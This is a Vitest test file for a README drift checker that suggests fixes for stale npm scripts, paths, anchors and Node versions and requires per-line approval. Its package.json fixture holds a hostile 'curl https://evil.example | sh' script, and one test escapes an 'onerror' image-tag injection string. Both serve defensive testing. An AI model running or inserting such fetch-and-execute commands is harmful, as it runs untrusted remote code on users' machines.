import { describe, it, expect } from "vitest";
import {
  driftClaims,
  evaluateDrift,
  minimumVersion,
} from "../src/workspace/drift-check.js";
import {
  driftProposals,
  applyDriftProposals,
  previewDriftChanges,
  placeFix,
  occurrences,
  sourceLines,
  DriftConflict,
  REMEDIABLE,
  convertsBuilder,
} from "../src/workspace/drift-remediation.js";
import "../src/components/evidence-snapshots.js";

const sha = (c) => c.repeat(40);
const target = {
  repository: "example/widget",
  branch: "main",
  path: "README.md",
};
const fence = (lang, ...lines) => ["```" + lang, ...lines, "```"].join("\n");
// A synthetic repository; the hostile script body must never be shown.
const packageJson = JSON.stringify({
  scripts: {
    build: "vite build",
    "test:unit": "vitest && curl https://evil.example | sh",
  },
  engines: { node: ">=20" },
});
const listing = new Map(
  [
    ["README.md"],
    ["package.json"],
    ["package-lock.json"],
    ["docs", "tree"],
    ["docs/Guide.md"],
    ["scripts", "tree"],
    ["scripts/Seed.js"],
  ].map(([path, type = "blob"], index) => [
    path,
    { path, type, sha: (index + 10).toString(16).padStart(40, "0"), size: 9 },
  ]),
);
const evidence = (tree = "complete") => ({
  head: sha("1"),
  tree,
  listing: tree === "failed" ? new Map() : listing,
  files: new Map([
    ["package.json", { status: "read", text: packageJson }],
    [
      "docs/Guide.md",
      { status: "read", text: "# Guide\n\n## Set up: the CLI\n" },
    ],
  ]),
  notes: [],
});
const check = (markdown, read = evidence()) =>
  evaluateDrift(driftClaims(markdown, target), read);
const byText = (result, text) =>
  result.results.find((item) => item.text === text);

// Lines 1-11: a mismatch with a suggestion on line 3, a mismatch without one
// on line 4, a case-only command path on line 5, an uncertain prose version
// on line 8 and an uncertain near anchor plus a case-only link on line 10.
const source = [
  "# Widget",
  "```bash",
  "npm run test-unit",
  "npm run lint",
  "node scripts/seed.js",
  "```",
  "",
  "Requires Node 18+ to run.",
  "",
  "See [the guide](docs/guide.md#setup) and [setup](docs/Guide.md#set-up--the-cli).",
  "",
].join("\n");

describe("drift fix suggestions", () => {
  it("suggests corrections only where the evidence supplies one", () => {
    const result = check(source);
    expect(byText(result, "npm run test-unit")).toMatchObject({
      status: "mismatch",
      fix: { find: "test-unit", replace: "test:unit", once: true },
    });
    // No similar script: no suggestion, the author decides.
    expect(byText(result, "npm run lint").status).toBe("mismatch");
    expect(byText(result, "npm run lint").fix).toBeUndefined();
    // A case-only path difference keeps the written form around it.
    expect(byText(result, "node scripts/seed.js")).toMatchObject({
      status: "mismatch",
      fix: { find: "scripts/seed.js", replace: "scripts/Seed.js" },
    });
    expect(byText(result, "Node 18+")).toMatchObject({
      status: "uncertain",
      fix: { find: "Node 18+", replace: "Node 20+" },
    });
    expect(byText(result, "docs/guide.md#setup")).toMatchObject({
      status: "mismatch",
      fix: { find: "docs/guide.md#setup", replace: "docs/Guide.md#setup" },
    });
    expect(byText(result, "docs/Guide.md#set-up--the-cli")).toMatchObject({
      status: "uncertain",
      fix: {
        find: "docs/Guide.md#set-up--the-cli",
        replace: "docs/Guide.md#set-up-the-cli",
      },
    });
  });

  it("never attaches a suggestion to unknown results or matches", () => {
    const unknown = check(source, evidence("failed"));
    expect(unknown.results.filter((item) => item.fix)).toEqual(
      // In-document anchors are still checked; none here.
      [],
    );
    const fine = check(fence("bash", "npm run build"));
    expect(fine.results[0].status).toBe("matches");
    expect(fine.results[0].fix).toBeUndefined();
  });

  it("suggests the similar anchor in this document and a relative link's case", () => {
    const result = check(
      "## Set up: the CLI\n\n[a](#Set-up-the-CLI!) [b](./docs/guide.md)\n",
    );
    expect(byText(result, "#Set-up-the-CLI!")).toMatchObject({
      status: "uncertain",
      fix: { find: "#Set-up-the-CLI!", replace: "#set-up-the-cli" },
    });
    expect(byText(result, "./docs/guide.md").fix).toEqual({
      find: "./docs/guide.md",
      replace: "./docs/Guide.md",
    });
  });
});

describe("fix placement", () => {
  it("matches whole words and refuses ambiguous single replacements", () => {
    expect(occurrences("npm run lint:fix && npm run lint", "lint")).toEqual([
      28,
    ]);
    expect(occurrences("see myguide.md or guide.md", "guide.md")).toEqual([18]);
    expect(occurrences("(#setup) (#setup-two)", "#setup")).toEqual([1]);
    expect(
      placeFix("npm run lint # lint it", {
        find: "lint",
        replace: "check",
        once: true,
      }),
    ).toBeNull();
    expect(
      placeFix("[a](docs/x.md) or [b](docs/x.md)", {
        find: "docs/x.md",
        replace: "docs/X.md",
      }),
    ).toBe("[a](docs/X.md) or [b](docs/X.md)");
    expect(placeFix("nothing here", { find: "x.md", replace: "X.md" })).toBe(
      null,
    );
    expect(placeFix("same", { find: "same", replace: "same" })).toBeNull();
  });
});

// A repository with case-only near misses next to correct, longer paths
// that end the same way.
const nested = (paths, files = []) => ({
  head: sha("1"),
  tree: "complete",
  listing: new Map(
    paths.map((path, index) => [
      path,
      {
        path,
        type: /\.\w+$/.test(path) ? "blob" : "tree",
        sha: (index + 10).toString(16).padStart(40, "0"),
        size: 9,
      },
    ]),
  ),
  files: new Map(files),
  notes: [],
});
const suggest = (markdown, read) =>
  driftProposals(markdown, evaluateDrift(driftClaims(markdown, target), read))
    .proposals;

describe("fix placement stays on its own claim", () => {
  it("never matches inside a longer path, URL or cross-file anchor", () => {
    const fix = { find: "docs/guide.md", replace: "docs/Guide.md" };
    expect(
      occurrences("[a](docs/guide.md) [b](other/docs/guide.md)", fix.find),
    ).toEqual([4]);
    expect(
      placeFix(
        "`docs/guide.md` or `other/docs/guide.md` or ../docs/guide.md",
        fix,
      ),
    ).toBe("`docs/Guide.md` or `other/docs/guide.md` or ../docs/guide.md");
    // Not the start of a longer path or URL either; end-of-sentence
    // punctuation is fine.
    expect(occurrences("docs/guide.md.bak docs/guide.md#x", fix.find)).toEqual(
      [],
    );
    expect(
      occurrences("See docs/guide.md. Or docs/guide.md/", fix.find),
    ).toEqual([4, 22]);
    expect(
      occurrences(
        "(#set-up--the-cli) (docs/x.md#set-up--the-cli)",
        "#set-up--the-cli",
      ),
    ).toEqual([1]);
    expect(occurrences("(./guide.md) (sub/guide.md)", "./guide.md")).toEqual([
      1,
    ]);
    expect(occurrences("(../guide.md)", "./guide.md")).toEqual([]);
  });

  it("leaves correct links, inline paths and commands that share a suffix untouched", () => {
    const repo = nested([
      "README.md",
      "Guide.md",
      "docs",
      "docs/Guide.md",
      "docs/guide.md",
      "other",
      "other/docs",
      "other/docs/guide.md",
      "scripts",
      "scripts/Seed.js",
      "tools",
      "tools/scripts",
      "tools/scripts/seed.js",
      "Seed.js",
      "sub",
      "sub/seed.js",
    ]);
    const cases = [
      ["See [guide](docs/Guide.md) and [other](other/docs/guide.md).", null],
      [
        "See [root guide](guide.md) and [docs guide](docs/guide.md).",
        "See [root guide](Guide.md) and [docs guide](docs/guide.md).",
      ],
      [
        "Edit `scripts/seed.js` or `tools/scripts/seed.js`.",
        "Edit `scripts/Seed.js` or `tools/scripts/seed.js`.",
      ],
      [
        fence("bash", "node scripts/seed.js && node tools/scripts/seed.js"),
        "node scripts/Seed.js && node tools/scripts/seed.js",
      ],
      [
        fence("bash", "node ./seed.js && node sub/seed.js"),
        "node ./Seed.js && node sub/seed.js",
      ],
    ];
    for (const [markdown, expected] of cases) {
      const proposals = suggest(markdown, repo);
      if (expected === null) expect(proposals).toEqual([]);
      else {
        expect(proposals).toHaveLength(1);
        expect(proposals[0].suggested).toBe(expected);
        expect(proposals[0].findings).toHaveLength(1);
        expect(proposals[0].findings[0].suggestion.placed).toBe(true);
      }
    }
  });

  it("does not rewrite a matching cross-file anchor for an in-document one", () => {
    const repo = nested(
      ["README.md", "docs", "docs/guide.md"],
      [["docs/guide.md", { status: "read", text: "## Set up & the CLI\n" }]],
    );
    const markdown =
      "## Set up the CLI\n\nSee [here](#set-up--the-cli) and [there](docs/guide.md#set-up--the-cli).\n";
    const result = evaluateDrift(driftClaims(markdown, target), repo);
    expect(byText(result, "docs/guide.md#set-up--the-cli").status).toBe(
      "matches",
    );
    const [proposal] = suggest(markdown, repo);
    expect(proposal.suggested).toBe(
      "See [here](#set-up-the-cli) and [there](docs/guide.md#set-up--the-cli).",
    );
  });
});

describe("link fixes land on the link, not a prose mention", () => {
  const repo = nested(["README.md", "docs", "docs/Guide.md"]);
  it("fixes the inline link line, not an earlier mention of its path", () => {
    const proposals = suggest(
      "Read docs/guide.md first,\nthen see [the guide](docs/guide.md).\n",
      repo,
    );
    expect(proposals).toHaveLength(1);
    expect(proposals[0]).toMatchObject({
      line: 2,
      before: "then see [the guide](docs/guide.md).",
      suggested: "then see [the guide](docs/Guide.md).",
    });
  });

  it("fixes a reference link at its definition", () => {
    for (const [markdown, line, suggested] of [
      [
        "The docs/guide.md file explains setup.\n[![CI][badge]][guide]\n\n[guide]: docs/guide.md\n",
        4,
        "[guide]: docs/Guide.md",
      ],
      ["See [guide][g].\n\n[g]: docs/guide.md", 3, "[g]: docs/Guide.md"],
    ]) {
      const proposals = suggest(markdown, repo);
      expect(proposals, markdown).toHaveLength(1);
      expect(proposals[0], markdown).toMatchObject({ line, suggested });
      expect(proposals[0].findings[0].suggestion.placed).toBe(true);
    }
  });

  it("suggests nothing when the link's own text cannot be found", () => {
    // The URL is entity-encoded in the source, so its line is a guess: the
    // prose mention must not be rewritten in its place.
    const markdown =
      "Read docs/guide.md first,\nthen see [the guide](docs/guide&#46;md).\n";
    const result = evaluateDrift(driftClaims(markdown, target), repo);
    expect(result.results).toHaveLength(1);
    expect(result.results[0].status).toBe("mismatch");
    expect(result.results[0].fix).toBeUndefined();
    for (const proposal of driftProposals(markdown, result).proposals)
      expect(proposal.suggested).toBe(proposal.before);
  });

  it("does not place a directory fix inside a longer path", () => {
    expect(occurrences("[d](docs/) and `docs/setup.md`", "docs/")).toEqual([4]);
    expect(occurrences("See docs/. Or docs/-x", "docs/")).toEqual([4]);
    const proposals = driftProposals(
      "See [the docs folder](docs/) and `docs/setup.md` at the root.",
      evaluateDrift(
        driftClaims(
          "See [the docs folder](docs/) and `docs/setup.md` at the root.",
          { ...target, path: "pkg/README.md" },
        ),
        nested(["pkg", "pkg/README.md", "pkg/Docs", "docs", "docs/setup.md"]),
      ),
    ).proposals;
    expect(proposals).toHaveLength(1);
    expect(proposals[0].suggested).toBe(
      "See [the docs folder](Docs/) and `docs/setup.md` at the root.",
    );
  });
});

describe("Node version suggestions", () => {
  const pkg = (node) =>
    nested(
      ["README.md", "package.json"],
      [
        [
          "package.json",
          { status: "read", text: JSON.stringify({ engines: { node } }) },
        ],
      ],
    );
  it("uses the whole engines.node minimum, not only its major", () => {
    expect(minimumVersion(">=20.11")).toBe("20.11");
    expect(minimumVersion(">=20.11.1")).toBe("20.11.1");
    expect(minimumVersion("^20.0.0 || >=22")).toBe("20");
    expect(minimumVersion(">20.11")).toBe("20.12");
    expect(minimumVersion(">18")).toBe("19");
    expect(minimumVersion("20.x || ^18.17")).toBe("18.17");
    expect(minimumVersion("<20")).toBeNull();
    const markdown = "Requires Node.js 18.17 or newer.";
    const result = evaluateDrift(driftClaims(markdown, target), pkg(">=20.11"));
    expect(result.results[0]).toMatchObject({
      status: "uncertain",
      fix: {
        find: "Node.js 18.17 or newer",
        replace: "Node.js 20.11 or newer",
      },
    });
    expect(result.results[0].message).toContain("(Node 20.11 or newer)");
    expect(suggest(markdown, pkg(">=20.11"))[0].suggested).toBe(
      "Requires Node.js 20.11 or newer.",
    );
  });

  it("places the whole minimum for every phrasing the check reads", () => {
    const cases = [
      ["Requires Node.js 18.17.", "Requires Node.js 20.11."],
      ["Node.js >= 18.17 is needed.", "Node.js >= 20.11 is needed."],
      ["Minimum Node v18.17.0 here.", "Minimum Node v20.11 here."],
      ["Use Node 18.17+ please.", "Use Node 20.11+ please."],
      // Two statements of the same old version on one line: both change,
      // so the suggested line does not contradict itself.
      [
        "Requires Node 18+ and Node.js 18 or newer.",
        "Requires Node 20.11+ and Node.js 20.11 or newer.",
      ],
    ];
    for (const [markdown, expected] of cases) {
      const [proposal] = suggest(markdown, pkg(">=20.11"));
      expect(proposal.suggested, markdown).toBe(expected);
      for (const finding of proposal.findings)
        expect(finding.suggestion.placed, markdown).toBe(true);
    }
    // One statement matched by two patterns is still one claim.
    const claims = driftClaims("Requires Node 18+ to run.", target).claims;
    expect(claims.map((claim) => claim.text)).toEqual(["Node 18+"]);
  });
});

describe("drift fix proposals", () => {
  it("builds one unapproved proposal per affected line from mismatches and uncertain findings only", () => {
    const result = check(source);
    const { proposals, excluded } = driftProposals(source, result);
    expect(proposals.map((p) => [p.line, p.status])).toEqual([
      [3, "mismatch"],
      [4, "mismatch"],
      [5, "mismatch"],
      [8, "uncertain"],
      [10, "mismatch"],
    ]);
    expect(excluded).toBe(
      result.results.filter((item) => !REMEDIABLE.includes(item.status)).length,
    );
    const at = (line) => proposals.find((p) => p.line === line);
    expect(at(3)).toMatchObject({
      before: "npm run test-unit",
      suggested: "npm run test:unit",
    });
    // No suggestion: the proposal starts unchanged for the author to edit.
    expect(at(4).suggested).toBe(at(4).before);
    expect(at(4).findings[0].suggestion).toBeNull();
    expect(at(4).findings[0].message).toContain('no "lint" script');
    expect(at(4).findings[0].evidencePath).toBe("package.json");
    expect(at(5).suggested).toBe("node scripts/Seed.js");
    expect(at(8).suggested).toBe("Requires Node 20+ to run.");
    // Two findings on one line are combined, each keeping its evidence.
    expect(at(10).findings.map((f) => f.status)).toEqual([
      "mismatch",
      "uncertain",
    ]);
    expect(at(10).suggested).toBe(
      "See [the guide](docs/Guide.md#setup) and [setup](docs/Guide.md#set-up-the-cli).",
    );
  });

  it("has no proposals for unknown results, and marks unplaceable suggestions", () => {
    const failed = check(source, evidence("failed"));
    expect(failed.counts.unknown).toBeGreaterThan(0);
    expect(driftProposals(source, failed).proposals).toEqual([]);
    const twice = fence("bash", "npm run test-unit # see test-unit docs");
    const { proposals } = driftProposals(twice, check(twice));
    expect(proposals[0].suggested).toBe(proposals[0].before);
    expect(proposals[0].findings[0].suggestion).toMatchObject({
      find: "test-unit",
      placed: false,
    });
    // A finding whose line is not in the Source gets no proposal.
    const odd = driftProposals("one line", {
      results: [{ id: "c", status: "mismatch", line: 9, text: "x" }],
    });
    expect(odd.proposals).toEqual([]);
    expect(odd.notes[0]).toContain("could not be matched");
  });

  it("numbers CRLF and lone-CR lines as the drift check does", () => {
    const crlf = source.replace(/\n/g, "\r\n");
    const { proposals } = driftProposals(crlf, check(crlf));
    expect(proposals.map((p) => p.line)).toEqual([3, 4, 5, 8, 10]);
    expect(proposals[0].before).toBe("npm run test-unit");
    expect(sourceLines("a\rb\r\nc").map((l) => [l.text, l.eol])).toEqual([
      ["a", "\r"],
      ["b", "\r\n"],
      ["c", ""],
    ]);
  });
});

describe("applying reviewed fixes", () => {
  const change = (line, before, after) => ({ line, before, after });

  it("changes only approved lines and keeps every other byte", () => {
    const crlf = "# T\r\n\r\nnode a.js\r\nkeep me  \r\nnode b.js";
    const { markdown, applied } = applyDriftProposals(crlf, crlf, [
      change(3, "node a.js", "node A.js"),
      change(5, "node b.js", "node B.js\nnode c.js"),
      change(4, "keep me  ", "keep me  "),
    ]);
    expect(applied).toBe(2);
    expect(markdown).toBe(
      "# T\r\n\r\nnode A.js\r\nkeep me  \r\nnode B.js\r\nnode c.js",
    );
  });

  it("rejects any Markdown edit since the check as a conflict", () => {
    const edited = source.replace("# Widget", "# Widget!");
    expect(() =>
      applyDriftProposals(source, edited, [
        change(3, "npm run test-unit", "npm run test:unit"),
      ]),
    ).toThrow(DriftConflict);
    expect(() =>
      applyDriftProposals(source, source + " ", [
        change(3, "npm run test-unit", "npm run test:unit"),
      ]),
    ).toThrow("changed since the drift check");
    expect(() =>
      applyDriftProposals(undefined, source, [
        change(3, "npm run test-unit", "npm run test:unit"),
      ]),
    ).toThrow(DriftConflict);
  });

  it("rejects stale, duplicate, missing and empty change sets", () => {
    expect(() =>
      applyDriftProposals(source, source, [change(3, "npm test", "x")]),
    ).toThrow("no longer matches");
    expect(() =>
      applyDriftProposals(source, source, [
        change(3, "npm run test-unit", "a"),
        change(3, "npm run test-unit", "b"),
      ]),
    ).toThrow("more than one change");
    expect(() =>
      applyDriftProposals(source, source, [change(99, "", "x")]),
    ).toThrow("not in the checked Markdown");
    expect(() => applyDriftProposals(source, source, [])).toThrow(
      "No approved change",
    );
    expect(() =>
      previewDriftChanges(source, [{ line: 3, before: "npm run test-unit" }]),
    ).toThrow(TypeError);
  });
});

describe("drift fix review dialog", () => {
  const open = (markdown = source, result = check(markdown)) => {
    const el = document.createElement("evidence-snapshots");
    document.body.append(el);
    el.configure({ draft: { id: "doc-1", markdown }, target });
    el.showDrift(result, null, markdown);
    return el;
  };
  const sent = (el) => {
    const events = [];
    el.addEventListener("evidence-action", (e) => events.push(e.detail));
    return events;
  };

  it("offers review only for a checked source with actionable findings", () => {
    const el = document.createElement("evidence-snapshots");
    el.configure({ draft: { id: "doc-1", markdown: source }, target });
    el.showDrift(check(source));
    expect(el.querySelector("[data-fix-review]")).toBeNull();
    el.showDrift(check(source, evidence("failed")), null, source);
    expect(el.querySelector("[data-fix-review]")).toBeNull();
    el.showDrift(check(source), null, source);
    expect(el.querySelector("[data-fix-review]").textContent).toBe(
      "Review fixes (5 lines)",
    );
    expect(el.querySelector("[data-fixes]").hidden).toBe(true);
  });

  it("shows evidence and exact diffs, requires approval per change and sends only approved lines", () => {
    const el = open();
    const events = sent(el);
    el.querySelector("[data-fix-review]").click();
    const fixes = el.querySelector("[data-fixes]");
    expect(fixes.hidden).toBe(false);
    expect(document.activeElement).toBe(fixes.querySelector("h2"));
    const items = [...fixes.querySelectorAll("[data-proposal]")];
    expect(items.map((item) => item.dataset.proposal)).toEqual([
      "3",
      "4",
      "5",
      "8",
      "10",
    ]);
    expect(fixes.textContent).not.toContain("evil.example");
    expect(items[3].querySelector("legend").textContent).toBe(
      "Line 8 · uncertain",
    );
    expect(items[3].textContent).toContain("may be correct as written");
    expect(items[0].textContent).toContain("Evidence file: package.json.");
    expect(items[0].querySelector("[data-fix-diff]").textContent).toBe(
      "@@ line 3 @@\n-npm run test-unit\n+npm run test:unit",
    );
    // Nothing is approved, and an unchanged proposal cannot be.
    const boxes = items.map((item) => item.querySelector("[data-fix-approve]"));
    expect(boxes.map((box) => box.checked)).toEqual(Array(5).fill(false));
    expect(boxes[1].disabled).toBe(true);
    const apply = fixes.querySelector("[data-fix-apply]");
    expect(apply.disabled).toBe(true);
    expect(fixes.querySelector("[data-after]").value).toBe(source);

    boxes[0].click();
    expect(apply.disabled).toBe(false);
    expect(apply.textContent).toBe("Apply 1 approved change");
    expect(fixes.querySelector("[data-after]").value).toBe(
      source.replace("npm run test-unit", "npm run test:unit"),
    );
    expect(fixes.querySelector("[data-diff]").textContent).toContain(
      "+npm run test:unit",
    );
    // Editing a proposal withdraws its approval.
    const field = items[0].querySelector("[data-fix-after]");
    field.value = "npm run build";
    field.dispatchEvent(new Event("input"));
    expect(boxes[0].checked).toBe(false);
    expect(apply.disabled).toBe(true);
    boxes[0].click();
    // A manual proposal becomes approvable once edited.
    const manual = items[1].querySelector("[data-fix-after]");
    manual.value = "npm run build";
    manual.dispatchEvent(new Event("input"));
    expect(boxes[1].disabled).toBe(false);
    boxes[1].click();
    apply.click();
    expect(events.at(-1)).toEqual({
      action: "remediate",
      id: null,
      changes: [
        { line: 3, before: "npm run test-unit", after: "npm run build" },
        { line: 4, before: "npm run lint", after: "npm run build" },
      ],
    });
    // The source is unchanged by the dialog itself.
    expect(el.drift.source).toBe(source);
    el.remove();
  });

  it("says before Apply when applying can detach builder sections", () => {
    const custom = { type: "custom", settings: { markdown: source } };
    expect(convertsBuilder({ blocks: [] })).toBe(false);
    expect(convertsBuilder({ blocks: [custom] })).toBe(false);
    expect(
      convertsBuilder({ blocks: [{ ...custom, githubGenerated: {} }] }),
    ).toBe(true);
    expect(convertsBuilder({ blocks: [{ type: "hero" }, custom] })).toBe(true);
    const review = (blocks) => {
      const el = document.createElement("evidence-snapshots");
      document.body.append(el);
      el.configure({
        draft: { id: "doc-1", markdown: source, blocks },
        target,
      });
      el.showDrift(check(source), null, source);
      el.querySelector("[data-fix-review]").click();
      return el.querySelector("[data-fix-builder]");
    };
    expect(review([custom])).toBeNull();
    expect(review([{ type: "hero" }, custom]).textContent).toContain(
      "Applying detaches any builder section, component or generated content whose lines change",
    );
  });

  it("escapes Markdown and evidence text and discards proposals on request", () => {
    const hostile = "[x](docs/<img src=x onerror=alert(1)>.md)\n";
    const el = open(hostile);
    el.querySelector("[data-fix-review]").click();
    const fixes = el.querySelector("[data-fixes]");
    expect(fixes.querySelector("img")).toBeNull();
    expect(fixes.querySelector("[data-fix-before]").value).toBe(hostile.trim());
    fixes.querySelector("[data-fix-discard]").click();
    expect(fixes.hidden).toBe(true);
    expect(el.querySelector("[data-status]").textContent).toContain(
      "Your Markdown is unchanged",
    );
    expect(document.activeElement).toBe(el.querySelector("[data-fix-review]"));
    // A new check (or a failed one) clears any open review.
    el.querySelector("[data-fix-review]").click();
    el.clearDrift();
    expect(el.querySelector("[data-fixes]").hidden).toBe(true);
    expect(el.approvedChanges()).toEqual([]);
    // Re-rendering the dialog (after applying, pinning or capturing) drops
    // the proposals, and settling a later action does not revive them.
    el.showDrift(check(source), null, source);
    el.querySelector("[data-fix-review]").click();
    el.querySelector("[data-fix-approve]").click();
    el.configure({ draft: { id: "doc-1", markdown: source }, target });
    expect(() => el.busy(false)).not.toThrow();
    expect(el.querySelector("[data-fixes]").hidden).toBe(true);
    expect(el.approvedChanges()).toEqual([]);
    el.remove();
  });
});

describe("link fixes skip code, comments, other URLs and unused definitions", () => {
  const repo = nested(["README.md", "docs", "docs/Guide.md"]);
  const recheck = (markdown) =>
    evaluateDrift(driftClaims(markdown, target), repo).results.filter(
      (item) => item.status !== "matches",
    );
  // Applies every suggestion and re-runs the check: nothing may remain.
  const fixAll = (markdown) => {
    const proposals = suggest(markdown, repo);
    const { markdown: fixed } = applyDriftProposals(
      markdown,
      markdown,
      proposals.map(({ line, before, suggested }) => ({
        line,
        before,
        after: suggested,
      })),
    );
    return { proposals, fixed };
  };
  it("fixes the definition a reference link uses", () => {
    for (const [markdown, line, suggested] of [
      // A fenced code sample of a definition.
      [
        "# T\n\n```md\n[guide]: docs/guide.md\n```\n\nSee [the guide][guide].\n\n[guide]: docs/guide.md",
        9,
        "[guide]: docs/Guide.md",
      ],
      // An indented code sample of a definition.
      [
        "# T\n\n    [guide]: docs/guide.md\n\nSee [the guide][guide].\n\n[guide]: docs/guide.md",
        7,
        "[guide]: docs/Guide.md",
      ],
      // A commented-out definition.
      [
        "<!--\n[g]: docs/guide.md\n-->\n\nSee [the guide][g].\n\n[g]: docs/guide.md",
        7,
        "[g]: docs/Guide.md",
      ],
      // An unused definition before the one the link uses.
      [
        "See [the guide][guide].\n\n[old]: docs/guide.md\n[guide]: docs/guide.md",
        4,
        "[guide]: docs/Guide.md",
      ],
      // Collapsed and shortcut references, matched without case.
      [
        "See [Guide][] or [GUIDE].\n\n[x]: docs/guide.md\n[guide]: docs/guide.md",
        4,
        "[guide]: docs/Guide.md",
      ],
      // A definition inside a block quote.
      [
        "See [the guide][q].\n\n> [q]: docs/guide.md",
        3,
        "> [q]: docs/Guide.md",
      ],
    ]) {
      const [result] = recheck(markdown);
      expect(result.line, markdown).toBe(line);
      const { proposals, fixed } = fixAll(markdown);
      expect(
        proposals.map((p) => [p.line, p.suggested]),
        markdown,
      ).toEqual([[line, suggested]]);
      expect(recheck(fixed), markdown).toEqual([]);
    }
  });

  it("fixes the inline link, not a code span or another URL's query", () => {
    for (const [markdown, expected] of [
      [
        "Write links as `[x](docs/guide.md)`,\nfor example [the guide](docs/guide.md).",
        [[2, "for example [the guide](docs/Guide.md)."]],
      ],
      [
        "Open [viewer](https://example.com/view?file=docs/guide.md)\nthen read [b](docs/guide.md).",
        [[2, "then read [b](docs/Guide.md)."]],
      ],
      [
        '<a href="https://example.com/?u=docs/guide.md">x</a>\n<a href="docs/guide.md">y</a>',
        [[2, '<a href="docs/Guide.md">y</a>']],
      ],
      [
        "See [viewer](https://example.com/view?file=docs/guide.md) and [b](docs/guide.md).",
        [
          [
            1,
            "See [viewer](https://example.com/view?file=docs/guide.md) and [b](docs/Guide.md).",
          ],
        ],
      ],
      [
        "[a](https://example.com/x,docs/guide.md) [b](docs/guide.md)",
        [[1, "[a](https://example.com/x,docs/guide.md) [b](docs/Guide.md)"]],
      ],
      [
        "- item\n\n  ```md\n  [x](docs/guide.md)\n  ```\n\n  See [b](docs/guide.md).",
        [[7, "  See [b](docs/Guide.md)."]],
      ],
    ]) {
      const { proposals, fixed } = fixAll(markdown);
      expect(
        proposals.map((p) => [p.line, p.suggested]),
        markdown,
      ).toEqual(expected);
      expect(recheck(fixed), markdown).toEqual([]);
    }
  });

  it("still fixes autolinks on their own line", () => {
    const url = "https://github.com/example/widget/blob/main/docs/guide.md";
    for (const second of [`then <${url}>.`, `then ${url} .`]) {
      const markdown = `Read docs/guide.md,${"\n"}${second}`;
      const { proposals, fixed } = fixAll(markdown);
      expect(
        proposals.map((p) => [p.line, p.suggested]),
        markdown,
      ).toEqual([[2, second.replace("guide.md", "Guide.md")]]);
      expect(recheck(fixed), markdown).toEqual([]);
    }
  });

  it("still places a path fix after a command option's `=`", () => {
    expect(
      occurrences("node x --config=docs/guide.md", "docs/guide.md"),
    ).toEqual([16]);
    expect(occurrences("<a href=docs/guide.md>", "docs/guide.md")).toEqual([8]);
    expect(occurrences("x?file=docs/guide.md", "docs/guide.md")).toEqual([]);
    expect(occurrences("x/a,docs/guide.md", "docs/guide.md")).toEqual([]);
    expect(occurrences("a, docs/guide.md", "docs/guide.md")).toEqual([3]);
  });

  it("marks a finding placed when an identical earlier fix already covered it", () => {
    const markdown =
      "Open `docs/guide.md` or see [the guide](docs/guide.md).\n";
    const [proposal] = suggest(markdown, repo);
    expect(proposal.suggested).toBe(
      "Open `docs/Guide.md` or see [the guide](docs/Guide.md).",
    );
    expect(proposal.findings).toHaveLength(2);
    for (const finding of proposal.findings)
      expect(finding.suggestion.placed).toBe(true);
  });
});

describe("Node versions that are linked, wrapped or only older in minor", () => {
  const pkg = nested(
    ["README.md", "package.json"],
    [
      [
        "package.json",
        {
          status: "read",
          text: JSON.stringify({ engines: { node: ">=20.11" } }),
        },
      ],
    ],
  );
  it("places the suggestion on the version when the statement is linked or wrapped", () => {
    for (const [markdown, line, suggested] of [
      [
        "Requires [Node.js](https://nodejs.org) 18 or newer.\n",
        1,
        "Requires [Node.js](https://nodejs.org) 20.11 or newer.",
      ],
      ["Requires Node.js\n18 or newer to run.\n", 2, "20.11 or newer to run."],
      [
        "- Requires [Node.js](https://nodejs.org)\n  v18.17 at least.\n",
        2,
        "  v20.11 at least.",
      ],
      // The version is written twice on the line: nothing is placed.
      [
        "Requires [Node.js](https://nodejs.org) 18+ (tested on 18+).\n",
        1,
        "Requires [Node.js](https://nodejs.org) 18+ (tested on 18+).",
      ],
    ]) {
      const [proposal] = suggest(markdown, pkg);
      expect(proposal, markdown).toMatchObject({ line, suggested });
      expect(proposal.findings[0].suggestion.placed, markdown).toBe(
        suggested !== proposal.before,
      );
    }
  });

  it("reports an older minor of the same major", () => {
    const result = evaluateDrift(
      driftClaims("Requires Node.js 20.5 or newer.", target),
      pkg,
    );
    expect(result.results[0]).toMatchObject({
      status: "uncertain",
      fix: {
        find: "Node.js 20.5 or newer",
        replace: "Node.js 20.11 or newer",
      },
    });
    expect(result.results[0].message).toContain("suggests Node 20.5;");
    // A major alone names the whole release line, and an equal or newer
    // minor matches.
    for (const markdown of [
      "Requires Node.js 20 or newer.",
      "Requires Node.js 20.11 or newer.",
      "Requires Node.js 20.12 or newer.",
      "Requires Node.js 22+.",
    ])
      expect(
        evaluateDrift(driftClaims(markdown, target), pkg).results[0].status,
        markdown,
      ).toBe("matches");
  });
});
